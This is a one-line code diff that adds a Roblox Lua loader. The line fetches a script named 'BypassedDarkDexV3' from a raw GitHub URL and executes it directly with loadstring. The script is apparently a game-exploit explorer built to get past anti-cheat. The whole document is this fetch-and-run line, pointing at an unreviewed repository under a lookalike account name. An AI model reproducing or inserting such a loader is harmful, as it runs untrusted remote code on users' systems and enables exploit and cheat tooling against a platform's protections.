@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CoreBIox/Dark-Dex-V3-restored-/refs/heads/main/BypassedDarkDexV3", true))()
